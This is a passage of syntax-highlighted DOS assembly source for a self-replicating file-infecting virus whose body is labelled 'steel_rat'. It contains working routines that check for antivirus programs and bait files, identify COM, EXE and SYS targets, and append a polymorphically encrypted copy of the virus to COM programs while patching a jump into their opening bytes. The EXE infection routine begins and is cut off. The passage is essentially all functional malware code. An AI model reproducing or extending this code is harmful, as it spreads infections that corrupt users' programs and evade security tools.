    </span><span class="sc6">retf</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">old</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc0">            </span><span class="sc1">; Old bytes inside virus body</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">host_ss</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Exe SS'n'SP</span><span class="sc0">
</span><span class="sc5">host_sp</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;------------------------- Testing Routines --------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">AAV</span><span class="sc0">
</span><span class="sc5">CheckAv</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">               </span><span class="sc1">; Find Zero</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'          ; Find last backslash
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">DiOk</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; No backslashes...</span><span class="sc0">
</span><span class="sc5">DiOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AVtbl</span><span class="sc0">
</span><span class="sc5">LChk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoMoreAvrs</span><span class="sc0">           </span><span class="sc1">; Blah.. No more AVr's ;)</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsIt</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">LChk</span><span class="sc0">
</span><span class="sc5">ItsIt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">NoMoreAvrs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">CheckAv</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

</span><span class="sc5">NoInt</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;------------------------- Testing Routines --------------------------</span><span class="sc0">
</span><span class="sc5">if_command</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">  </span><span class="sc10">near</span><span class="sc0">               </span><span class="sc1">; Check for command.com</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; Find zero</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">             </span><span class="sc1">; Load previous letter before 0</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'oc'</span><span class="sc0">             </span><span class="sc1">; 'co' ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Borp</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'mm'</span><span class="sc0">             </span><span class="sc1">; "mm" ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Borp</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'na'</span><span class="sc0">             </span><span class="sc1">; "an" ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Borp</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'.d'</span><span class="sc0">             </span><span class="sc1">; "d." ?</span><span class="sc0">
</span><span class="sc5">Borp</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">if_command</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;----------------------- Scan for Extension --------------------------</span><span class="sc0">
</span><span class="sc1">; Returns 0 - Unknown , 1 - Com , 2 - Exe , 3 - Sys</span><span class="sc0">
</span><span class="sc5">scan</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">              </span><span class="sc1">; Find "."</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">; Load word after dot</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">             </span><span class="sc1">; To lower-case</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'oc'</span><span class="sc0">             </span><span class="sc1">; 'Co' ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Test_for_Com</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ys'</span><span class="sc0">             </span><span class="sc1">; 'Sy' ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Test_for_Sys</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'xe'</span><span class="sc0">             </span><span class="sc1">; 'Ex' ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Test_for_Exe</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Lyaps</span><span class="sc0">

</span><span class="sc5">Test_for_Com</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc0">              </span><span class="sc1">; 'm' ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Lyaps</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Uknown</span><span class="sc0">
</span><span class="sc5">Test_for_Exe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'e'</span><span class="sc0">              </span><span class="sc1">; 'e' ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Lyaps</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Uknown</span><span class="sc0">
</span><span class="sc5">Test_for_Sys</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc0">              </span><span class="sc1">; 's' ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Lyaps</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Uknown</span><span class="sc0">
</span><span class="sc5">Lyaps</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Uknown</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">scan</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">dos</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">r21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Call dos</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">dos</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;----------------------- Infection Routines -----------------------</span><span class="sc0">
</span><span class="sc5">infect_com</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">savea</span><span class="sc0">              </span><span class="sc1">; Drop attributes</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; Open file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ComFileGood</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Com_Infect_done</span><span class="sc0">
</span><span class="sc5">ComFileGood</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckInf</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckComBait</span><span class="sc0">
</span><span class="sc5">ClCOM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close_Com_File</span><span class="sc0">
</span><span class="sc5">CheckComBait</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoCBait</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckBait</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ClCOM</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">old</span><span class="sc0">           </span><span class="sc1">; Load first 4 bytes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">         </span><span class="sc1">; Masked exe ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Close_Com_File</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">; To the end of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">60000</span><span class="sc4">-</span><span class="sc5">Vlen</span><span class="sc0">           </span><span class="sc1">; Size &gt; 60000-Vlen ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">Close_Com_file</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">MinCom</span><span class="sc4">+</span><span class="sc5">Vlen</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Close_Com_File</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">CHost</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CryptHost</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">host</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; Host = Com</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">SlowPoly</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">MakeSlow</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">steel_rat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">free</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vlen</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">smm</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FLen</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; Store new length</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; Write us</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">; Create and</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">             </span><span class="sc1">; patch jmp</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; To the start of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">              </span><span class="sc1">; Write Jmp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mark</span><span class="sc0">               </span><span class="sc1">; Mark that file infected</span><span class="sc0">

</span><span class="sc5">Close_Com_File</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">              </span><span class="sc1">; Close file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

</span><span class="sc5">Com_Infect_Done</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">resta</span><span class="sc0">              </span><span class="sc1">; Restore attributes</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_com</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">infect_exe</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">savea</span><span class="sc0">              </span><span class="sc1">; Drop attributes</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; Open file</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ExeInfect</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Exe_Infect_Done</span><span class="sc0">
</span><span class="sc5">ExeInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckInf</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">CloseExe</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoCBait</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckBait</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseExe</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">          </span><span class="sc1">; Read exe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AllOk</span><span class="sc0">
</span><span class="sc5">CloseExe</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close_Exe</span><span class="sc0">
</span><span class="sc5">AllOk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; MZ ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CloseExe</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">temp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Check for overlays</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; Multiply PageCnt by 512</span><span class="sc0">

